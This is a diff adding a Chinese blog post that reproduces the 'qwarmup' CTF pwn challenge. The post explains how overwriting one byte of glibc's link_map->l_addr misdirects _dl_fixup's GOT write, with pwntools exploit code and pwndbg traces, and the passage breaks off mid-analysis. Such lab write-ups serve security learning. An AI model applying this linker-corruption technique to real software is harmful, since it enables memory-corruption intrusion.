@@ -156,6 +156,287 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/" class="post-title-link" itemprop="url">dl_runtime_resolve attack+svcudp_reply控制栈</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-23 00:40:46 / Modified: 00:44:06" itemprop="dateCreated datePublished" datetime="2022-08-23T00:40:46+08:00">2022-08-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>14 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>qwarmup 复现</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup file qwarmup          </span><br><span class="line">qwarmup: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">0</span>ee74cf51da29e8ecc9897c2a2a96b4ce87934be, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  qwarmup checksec qwarmup      </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/qwarmup/qwarmup&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，开了 NX，开了 PIE，开了 Canary，但是 GOT 可改（启用了延迟绑定）</li>
+</ul>
+<p>有沙盒</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup seccomp-tools dump ./qwarmup1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+<ul>
+<li>只能打 ORW</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> byte; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  read(<span class="number">0</span>, &amp;size, <span class="number">4uLL</span>);</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    offset = <span class="number">0LL</span>;</span><br><span class="line">    byte = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;offset, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;byte, <span class="number">1uLL</span>);</span><br><span class="line">    chunk[offset] = byte;                       <span class="comment">// 溢出？</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Success!&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">    HIWORD(key) = HIWORD(size);                 <span class="comment">// 大于0x10000的部分赋值key</span></span><br><span class="line">    LOWORD(key) = <span class="number">0</span>;                            <span class="comment">// 小于0x10000的部分置空</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !key );</span><br><span class="line">  _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>题目中会检查 size：<ul>
+<li>如果 size 小于0x10000，可以循环写</li>
+<li>如果 size 大于0x10000，只能写一次</li>
+</ul>
+</li>
+</ul>
+<p><strong>了解延迟绑定的细节</strong></p>
+<p>延迟绑定机制：</p>
+<ul>
+<li>启用延迟绑定后，程序不会把库函数的真实地址绑定在 GOT 表中</li>
+<li>当程序第一次调用该函数时，会先找到该函数对应的 PLT 表，然后跳转对应的 GOT 表</li>
+<li>GOT 表中没有该函数的真实地址，而是会跳转回 PLT 表</li>
+<li>在 PLT 表中：先 push 一个偏移（用于确定自身函数），然后在 PLT 表中进入共用的 PLT[0] 表</li>
+<li>在 PLT[0] 表中：先 push <code>link_map</code>（为 <code>_dl_fixup</code> 提供信息），然后执行 <code>_dl_runtime_resolve_fxsave</code> 函数</li>
+<li>接着使用 <code>_dl_fixup</code> 函数来查找目标在动态链接库中的地址</li>
+<li>最后把对应 GOT 表地址修改为库函数的真实地址</li>
+</ul>
+<p><code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code> 接受两个参数，一个“链接映射”和一个“重定位索引”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>“链接映射”：将有关 ELF 的所有相关信息包装成一个非常简洁的数据结构 <code>link_map</code></li>
+<li>“重定位索引”：用于确定该函数在 PLT/GOT 表中的位置</li>
+</ul>
+<p>它将使用“链接映射”来确定“重定位索引”所指的符号，并提供大量其他需要的信息来进行符号解析，其中最重要的就是“解析地址”计算</p>
+<ul>
+<li><code>_dl_fixup</code> 利用存储在 <code>link_map</code> 中的信息来确定符号 <code>@got</code>（称为“解析地址”）的位置</li>
+<li>如果我们欺骗 <code>_dl_fixup</code> 计算错误的解析地址并且 <code>write@got</code> 仍然是 <code>write@plt+6</code>，利用这一点将是有价值的，我们永远不会在字节写入后丢失 <code>_dl_fixup</code> 作为攻击面</li>
+</ul>
+<p>实现重定位的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
+<p>当运行时加载器加载 ELF 时，它会通过 .dynamic 部分中的条目定位不同的数据结构，例如存储析构函数或 GOT 的位置，这是 .dynamic 部分的样子：</p>
+<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661098830166.png" alt="1661098830166"> </p>
+<p>.dynamic 段中往往保存着多个元素，元素的数据结构为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>d_tag：标签所做的只是描述值，告诉加载器 <code>d_un</code> 数据的意义，常见的类型如下表：</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><code>d_tag</code>类型</th>
+<th><code>d_un</code>的定义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DT_SYMTAB - 6</td>
+<td>d_ptr 记录动态链接符号表(.dynsym)的地址偏移</td>
+</tr>
+<tr>
+<td>DT_STRTAB - 5</td>
+<td>d_ptr 记录动态链接字符串表(.dynstr)的地址偏移</td>
+</tr>
+<tr>
+<td>DT_STRSZ - 10</td>
+<td>d_val 记录动态链接字符串表(.dynstr)的大小</td>
+</tr>
+<tr>
+<td>DT_HASH - 4</td>
+<td>d_ptr 表示动态链接hash表(.hash)的地址</td>
+</tr>
+<tr>
+<td>DT_SONAME - 14</td>
+<td>本共享对象的SO-NAME</td>
+</tr>
+<tr>
+<td>DT_RPATH - 15</td>
+<td>动态链接共享对象的搜索路径</td>
+</tr>
+<tr>
+<td>DT_INIT - 12</td>
+<td>初始化代码地址</td>
+</tr>
+<tr>
+<td>DT_FINIT - 13</td>
+<td>结束代码地址</td>
+</tr>
+<tr>
+<td>DT_NEED - 1</td>
+<td>当前文件依赖的共享目标文件的文件名</td>
+</tr>
+<tr>
+<td>DT_REL/DT_RELA - 17/7</td>
+<td>动态链接重定位表地址</td>
+</tr>
+<tr>
+<td>DT_RELAENT - 9</td>
+<td>动态链接重定位表项的数目</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>运行时，加载器将读取每个 Elf64_Dyn 条目，并在 ELF 的 <code>link_map</code> 中存储指向每个条目的指针（具体来说，指向每个 Elf64_Dyn 的指针将存储在 <code>link_map-&gt;l_info</code> 数组中，由标签索引）</p>
+<ul>
+<li>因此，加载器可以使用 <code>l-&gt;l_info[DT_FINI]</code> 访问对应的 Elf64_Dyn </li>
+<li>那么，就可以通过 <code>l-&gt;l_info[DT_FINI].d_un.d_ptr</code> 轻松读取 <code>DT_SYMTAB DT_SYMTAB</code> 的地址</li>
+</ul>
+<p>接下来就需要 [重定位表] 来索引目标的位置，每个条目都有一个 <code>r_offset</code> 属性，它指定符号的解析地址应该放在哪里：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
+<p>看了下面这张图就明白了：</p>
+<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661100223655.png" alt="1661100223655"> </p>
+<ul>
+<li>由于 <code>r_offset</code> 属性是一个偏移量而不是一个绝对指针，我们需要添加 <code>l-&gt;l_addr</code> 来获得解析地址，也就是如下代码的实现：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
+<p><strong>入侵思路</strong></p>
+<p>当申请的堆块足够大时，可以申请到接近 libc 前面内存，有一次 WAA libc 的机会（只有1字节）</p>
+<p>根据 <code>_dl_fixup_</code> 的寻址规则，我们在 <code>_dl_fixup_</code> 查找完函数地址回填到 GOT 表后，可以通过修改 <code>link_map-&gt;l_addr</code>，使回填的函数填到 <code>write@got</code> 某个偏移的地方（<code>bss-&gt;size</code>）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fcefdddf2e8</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fcefdddf2f0</span> —▸ <span class="number">0x55a47f543df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fcefdddf2f8</span> —▸ <span class="number">0x7fcefdddf890</span> —▸ <span class="number">0x7ffdfdf5b000</span> ◂— jg     <span class="number">0x7ffdfdf5b047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fcefdddf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fcefdddf308</span> —▸ <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fcefdddf310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fcefdddf318</span> —▸ <span class="number">0x7fcefdddf870</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fcefda86000</span> <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">0x7fcefda86000</span>-&gt;<span class="number">0x7fcefdddf2e0</span> is <span class="number">0x3592e0</span> bytes (<span class="number">0x6b25c</span> words)</span><br></pre></td></tr></table></figure>
+<p>示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span> - <span class="number">0x10</span> <span class="comment"># 通过mmap申请的chunk与link_map之间的偏移</span></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span> <span class="comment"># 位于bss段的size</span></span><br><span class="line"></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>]))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行覆盖的汇编代码：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x70</span> <span class="comment">/* 计算出来的,用于覆盖link_map-&gt;l_addr末尾的值 */</span></span><br><span class="line"> RDX  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x556d291ff4bb</span>    mov    byte ptr [rdx], al</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改前：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改后：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>通过 <code>l-&gt;l_addr + reloc-&gt;r_offset</code> 公式来计算 <code>write@got</code> </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Rela &lt;<span class="number">4018</span>h, <span class="number">300000007</span>h, <span class="number">0</span>&gt;       ; R_X86_64_JUMP_SLOT write</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: hex(<span class="number">0x556d291fe070</span>+<span class="number">0x4018</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;0x556d29202088&#x27;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>函数 <code>_dl_fixup_</code> 执行完毕以后，就会根据错误的 <code>link_map-&gt;l_addr</code> 来把错误的地址给改为 <code>write</code> 的真实地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x000f000000000000</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br></pre></td></tr></table></figure>
